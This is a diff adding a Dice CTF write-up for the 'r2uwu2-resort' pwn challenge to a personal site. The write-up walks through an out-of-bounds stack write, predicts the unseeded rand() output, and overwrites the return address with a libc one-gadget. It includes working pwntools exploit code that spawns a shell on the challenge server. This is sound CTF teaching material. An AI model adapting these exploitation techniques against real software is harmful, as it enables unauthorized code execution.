@@ -3,7 +3,7 @@
 
 <head>
 	<link rel="stylesheet" type="text/css" href="../format.css">
-	<title>Dice CTF 2025</title>
+	<title>Dice CTF</title>
 
 
 	<link rel="apple-touch-icon" sizes="180x180" href="../resources/apple-touch-icon.png">
@@ -14,6 +14,7 @@
 	<meta name="msapplication-TileColor" content="#da532c">
 	<meta name="theme-color" content="#ffffff">
     <script type="text/javascript" src="https://unpkg.com/showdown/dist/showdown.min.js"></script>
+    <script type="text/javascript" src="/prism.js"></script>
 	<link href="/prism.css" rel="stylesheet" />
 </head>
 
@@ -29,22 +30,226 @@
 			<a href="/Write-Ups/index.html" id="button-link" class="button-link-hover">Write-Ups</a><br>
 			<a href="https://github.com/pawnlord" id="button-link" class="button-link-hover">Github</a><br>
 			</div><br>
-			<div id="header-replace-me"></div>
+			<div id="header-replace-me">
+				<div id="header-list"> 
+					<a href="Buckeye CTF.html" id="button-link" class="button-link-hover">Buckeye CTF</a></br>
+<a href="cursed CTF.html" id="button-link" class="button-link-hover">cursed CTF</a></br>
+<a href="Dice CTF.html" id="button-link" class="button-link-hover">Dice CTF</a></br>
+<a href="Sekai CTF.html" id="button-link" class="button-link-hover">Sekai CTF</a></br>
+<a href="TCP1P.html" id="button-link" class="button-link-hover">TCP1P</a></br>
+<a href="UIUCTF.html" id="button-link" class="button-link-hover">UIUCTF</a></br>
+<a href="UMD CTF.html" id="button-link" class="button-link-hover">UMD CTF</a></br>
+<a href="x3CTF.html" id="button-link" class="button-link-hover">x3CTF</a></br>
+
+				</div> 
+			</div>
 		</div>
 	
 
-		<div style="margin-left: 30%; width: 80%" id="content-replace-me">
-			
+		<div style="margin-left: 30%; width: 80%">
+			<h1>Dice CTF</h1>
+<h2>r2uwu2-resort (pwn)</h2>
+<h3>hint</h3>
+<pre><code>I heard that r2uwu2 just won an all-expenses paid trip to a ✨ Celestial Resort ✨ on the slopes of Canada! But this trip might not be
+all that it's cracked up to be - there's dust bunnies abound and garbage is cycling everywhere...
+  - arcblroth
+</code></pre>
+<p>The most solved pwn challenge but fairly involved. We are given a binary, a Dockerfile, and a source file. The binary has the usual checksec mitigations enabled: Full RELRO, Canaries, NX bit, and PIE.</p>
+<h3>context</h3>
+<p>The binary is an RPG game where 3 dust bunnies attack you. You need to kill them with various weapons before your HP drops below 0. If all three of them die, it exits with 0. There are 4 items we can attack with. Items 0-2 do a random amount of damage from 0-255 to the selected enemy and item 3 sets the selected enemy's health to 0.</p>
+<p>Even with this basic behavior, there are some issues: First, our HP can never drop below 0 as it is a <code>uint8_t</code>. Second, we have an MP bar, but it does nothing. This means that we can attack as many times as we want until all bunnies die.</p>
+<p>The next issue is with the damage dealt: A bunnies HP is an <code>int_8</code>, and when we attack we can do 255 damage. This is equivalent to subtracting by one and won't kill the bunny. This ended up not mattering, but it could have if we wanted to set RAX to 0 for the one gadget to work.</p>
+<p>More importantly to the exploit, the menu screen gives us a leak of the pointer to the function <code>print_ui</code>. This means we know the location of the <code>text</code> section for the binary:</p>
+<pre><code class="language-c">  printf(&quot;%-23p&quot;, &amp;print_ui);
+</code></pre>
+<h3>vulnerability</h3>
+<p>When we input the choice, the following code is ran:</p>
+<pre><code class="language-c">printf(&quot;Attack with [%s] against which bunny? (1-3) &gt; &quot;, items[item]);
+fflush(stdout);
+if (scanf(&quot;%d%*[^\n]&quot;, &amp;choice) == 0) {
+    puts(&quot;bad input &gt;:(&quot;);
+    fflush(stdout);
+    return 1;
+}
+</code></pre>
+<p>Notably, there is no bounds checking. This means that when the attack code is ran, we can get an out-of-bounds write:</p>
+<pre><code class="language-c">uint8_t dmg;
+if (item == 3) {
+    bunnies[choice - 1].hp = 0;
+} else {
+    dmg = rand() % 255;
+    bunnies[choice - 1].hp -= dmg;
+}
+</code></pre>
+<p>So we have two ways of using this out-of-bounds write depending on the item chosen. If <code>item == 3</code>, we set the memory at <code>bunnies + choice - 1</code> to 0. If <code>item &lt; 3</code>, we subtract a random number between 0 and 254 from the memory at <code>bunnies + choice - 1</code>.</p>
+<p>Clearly, if we know the random value, this becomes an arbitrary write on the stack as we can 0 the index on the stack we want to overwrite, and then find a random value that equals the negation of the value we want to right. So if we want to write 0xFF at <code>bunnies + 120</code>, we choose to attack index 120 when item = 3 and then look for a random value that equals 0x1 afterwards. With this alone we would be able to do a full ROP chain using the given binary.</p>
+<p>Luckily, the challenge never seeds the rand function. To be completely safe, I generated all the random values from the docker image with this C code:</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    printf(&quot;20000 random values\n&quot;);
+    for (int i = 0; i &lt; 20000; i++) {
+        printf(&quot;%u\n&quot;, rand());
+    }
+}
+</code></pre>
+<p>We expect to get every value we would need a few times over with this, so it should be good enough for us. I then wrote some python code to simulate the rand calls that resort.c makes:</p>
+<pre><code class="language-py">import rand_vals as rv
+dmgs = [] # The damage we will do when taking action[i]
+
+i = 0 # The number of random values we have generated
+taken = 0 # The number of actions we have taken
+while taken &lt; 5000:
+    taken += 1 # We are taking another action
+    
+    item = rv.vals[i] % 4 # Generate an item and increase our rand call count
+    i += 1
+
+    if item != 3:
+        dmg = rv.vals[i] # Generate another random value representing damage done, increase number of rand calls
+        i += 1
+        dmgs.append(dmg % 255)
+    else:
+        dmgs.append(-1) # If the item is 3, put a special value to mark it as such
+
+print(dmgs)
+</code></pre>
+<p>(rand_vals is a python file with <code>vals = [&lt;insert random values generated above here&gt;]</code> in it. Note that you could use ctypes here and it would work just as well.)</p>
+<h3>exploit</h3>
+<p>We can now do ROP gadgets, and ROP gadgets are good, but to use them we would need a LibC leak as we don't have a <code>syscall</code> gadget. But we can do more with this information: on the stack we find <code>__libc_start_call_main + 128</code> is the return address. We don't have an easy way to leak it, but what we do have is a way to subtract from its bytes. After downloading the libc from the Docker image (and grabbing the wrong one, setting me back an hour or two) we find the following one gadget:</p>
+<pre><code class="language-c">0xebce2 execve(&quot;/bin/sh&quot;, rbp-0x50, r12)
+constraints:
+  address rbp-0x48 is writable
+  r13 == NULL || {&quot;/bin/sh&quot;, r13, NULL} is a valid argv
+  [r12] == NULL || r12 == NULL || r12 is a valid envp
+</code></pre>
+<p>If we look at the disassembly of resort's main function, the postlude looks like this:</p>
+<pre><code class="language-asm">pop    rbx
+pop    r12
+pop    r13
+pop    r14
+pop    r15
+pop    rbp
+ret
+</code></pre>
+<p>Because of the earlier stack write primitive, we know that we control all 3: <code>rbp</code>, <code>r13</code>, and <code>r12</code>, and it is especially easy to set them to 0. <code>rbp-0x48</code> needs to be writeable, but luckily we know where the data section is from the <code>print_ui</code> leak and can set rbp to be somewhere in the data section plus 0x48 to satisfy the constraint. This means that if we can add <code>0xebce2 - (libc.symbols[&quot;__libc_start_call_main&quot;] + 128)</code> from the return address, we can get a one gadget, which is much cleaner than a messy ROP chain.</p>
+<p>So then, we need to be able to subtract two numbers. But we can only subtract bytes! Luckily probability is on our side. This is going to be a little bit of a detour to explain it because its a little confusing.</p>
+<h4>subtracting byte-by-byte</h4>
+<p>Lets say <code>libc.symbols[&quot;__libc_start_call_main&quot;] + 128</code> had the offset <code>0x304050</code> and we wanted to set it to a one gadget at <code>0x405060</code>. Without ASLR, this is simple because we can subtract <code>0xF0</code> (as <code>-0xF0 = 0x10 % 0x100</code>) from each byte and we have our correct offset. Lets say we have <code>LIBC_OFFSET = 0x10101010</code>. Then it is similarly easy, as <code>0x304050 + LIBC_OFFSET = 0x10405060</code> and <code>0x405060 + LIBC_OFFSET = 0x10506070</code>. As you can see, we still only need to add <code>0x10</code> to each byte to get the address to be correct! However, lets say we get unlucky, and <code>LIBC_OFFSET = 0xA0A0A0</code>. Then <code>0x304050 + LIBC_OFFSET = 0xC0D0E0</code>, but <code>0x405060 + LIBC_OFFSET = 0xD0E100</code>! Now we need to add <code>0xE0</code> to the first byte and <code>0x11</code> to the second byte. This only happens if there is an index in an offset such that <code>offset[i] + LIBC_OFFSET[i] &gt;= 0x100</code>, or put another way, we want to avoid carries between bytes. This still gives us good odds enough odds to get the offset that we want if we just blindly subtract as though the ASLR does not cause a carry, as long as each byte in the ASLR is small enough.</p>
+<p>So we have our exploit: Replace RBP, R12, and R13 with the desired values, and subtract <code>(libc.symbols[&quot;__libc_start_call_main&quot;] + 128) - 0xebce2</code> byte-wise from the return address, and then exit the program.</p>
+<h3>implementing the exploit</h3>
+<p>The implementation can be broken down into a few functions: <code>set_byte</code>, <code>sub_byte</code>, and <code>run</code>. I also use a method <code>kill_bunnies</code> (<code>:(</code>) but its not necessary for this exploit (it was used for an earlier version with the wrong libc version, where the one gadget required <code>rax = 0</code> to work, so we needed a successful exit). The basic outline of the implementation is as follows:</p>
+<ul>
+<li><code>actions</code> represents what number the program will send at the ith prompt. So if <code>actions[10] = 2</code>, then we will attack the second bunny after being prompted for the 11th time.</li>
+<li><code>dmgs</code> is an array representing what damage we deal for a given action, so if <code>dmgs[10] = 0x30</code>, we will deal 48 damage to the second bunny after being prompted for the 11th time.</li>
+<li><code>latest</code> represents the last action we have decided to take. When we reach this action, we want to change to interactive mode to cat the flag.</li>
+<li>We need to convert from <code>rsp</code> offset to <code>bunnies</code> offset. The <code>bunnies</code> array starts at <code>rsp + 12</code> and the selected bunny is subtracted by one, so we want <code>offset = stack_offset - 11</code> to get our desired position.</li>
+</ul>
+<p>Then we have the actual implementations:</p>
+<ul>
+<li><code>sub_byte(addr_offset, val)</code>: Search through <code>dmgs</code> until we find one equivalent to <code>dmg = val</code> that has not been selected for an action yet. Set the action to take to be <code>offset = addr_offset - 11</code></li>
+</ul>
+<pre><code class="language-py">def sub_byte(addr_offset, val):
+    global actions, dmgs, latest
+    offset = addr_offset - 11
+    for i, dmg in enumerate(dmgs):
+        if dmg == val and isnothing(i):
+            actions[i] = offset
+            print(&quot;Action&quot;, i, &quot;caused&quot;,  dmg, &quot;damage&quot;)
+            if i+1 &gt; latest:
+                latest = i+1
+            return
+    print(&quot;No action found&quot;)
+</code></pre>
+<ul>
+<li><code>set_byte(addr_offset, val)</code>: Search through dmgs until we find an unused -1 (which sets its offset to 0). Set the action to the calculated offset. Then continue until we find another <code>dmg = (-val &amp; 0xFF)</code>. Again set the action to the calculated offset</li>
+</ul>
+<pre><code class="language-py">def set_byte(addr_offset, val):
+    global actions, dmgs, latest
+    offset = addr_offset - 11
+    found_zero = False
+    for i, dmg in enumerate(dmgs):
+        if not found_zero and dmg == -1 and isnothing(i):
+            actions[i] = offset
+            print(&quot;Action&quot;, i, &quot;zeroed&quot;, addr_offset)
+            if i+1 &gt; latest:
+                latest = i+1
+            found_zero = True
+                
+        if found_zero and dmg == (-val) &amp; 0xFF and isnothing(i):
+            actions[i] = offset
+            print(&quot;Action&quot;, i, &quot;caused&quot;, dmg, &quot;damage&quot;)
+            if i+1 &gt; latest:
+                latest = i+1
+            return
+    print(&quot;No action found&quot;)
+</code></pre>
+<ul>
+<li><code>set_long(addr_offset, bval, n=6)</code>: Run <code>set_byte(addr_offset+i, bval[i])</code> for i in 0..n. The reason we set n = 6 is because addresses tend to have 0 at the highest 2 bytes anyway.</li>
+</ul>
+<pre><code class="language-py">def set_long(addr_offset, bval, n=6):
+    global actions, dmgs, latest
+    for i in range(n):
+        set_byte(addr_offset+i, bval[i])
+</code></pre>
+<ul>
+<li><code>run()</code>: Go through the actions array, sending each value to the remote until we are past latest or the program asks to be ended.</li>
+</ul>
+<pre><code class="language-py">def run(r):
+    global actions, latest
+    for i, a in enumerate(actions[:latest]):
+        if a == DIE:
+            r.sendline(b'a')
+            break
+        if a != NOTHING:
+            print(&quot;Action&quot;, i, &quot;=&quot;, a)
+
+        r.sendline(str(a).encode())
+    r.interactive()
+</code></pre>
+<p>With these helper functions, we can finally run our exploit:</p>
+<pre><code class="language-py">r = remote(&quot;dicec.tf&quot;, 32030)
+
+# Get a leak of main to find the data address
+first_resp = r.recvuntil(b' &gt; ')
+# get_hex returns all strings of the form 0x[0-9a-f] as numbers. The last one will be &amp;print_ui.
+leak = get_hex(first_resp)[-1]
+
+chal.address = leak - chal.symbols[&quot;print_ui&quot;]
+
+
+onegadget = 0xebce2
+retaddr = libc.symbols[&quot;__libc_start_call_main&quot;] + 128
+
+bonegadget = p64(onegadget)
+bretaddr = p64(retaddr)
+
+# Figure out what we need to subtract bitwise for the relative write
+sub1 = (bretaddr[0] - bonegadget[0]) &amp; 0xFF
+sub2 = (bretaddr[1] - bonegadget[1]) &amp; 0xFF
+sub3 = (bretaddr[2] - bonegadget[2]) &amp; 0xFF
+
+bmain = p64(chal.symbols[&quot;main&quot;])
+
+set_long(80, p64(0)) # set r12 to 0
+set_long(88, p64(0)) # set r13 to 0
+set_long(112, p64(chal.symbols[&quot;items&quot;] + 0x48)) # set rbp to some .data variable + 0x48
+
+# Offset the return address to one gadget
+sub_byte(120, sub1)
+sub_byte(121, sub2)
+sub_byte(122, sub3)
+
+kill_bunnies()
+run(r)
+</code></pre>
+<p>And with this, we get a shell and can run <code>cat flag.txt</code></p>
+<p>The final script can be found as a <a href="https://gist.github.com/pawnlord/b84f3b89d6942c1d83ee6150adce69f8">gist on my github</a> (along with the <a href="https://gist.github.com/pawnlord/422780d02b414daa98fcbcad10443c6c">random values</a>, for completeness)</p>
+
 		</div>
 	</div>
     
-    <script type="text/javascript">
-		(async () => {
-			let gw = await import("./genWriteups.js");
-			gw.replaceInstances("Dice CTF");
-			gw.replaceHeader();
-		})();
-    </script>
 
  
 </body>
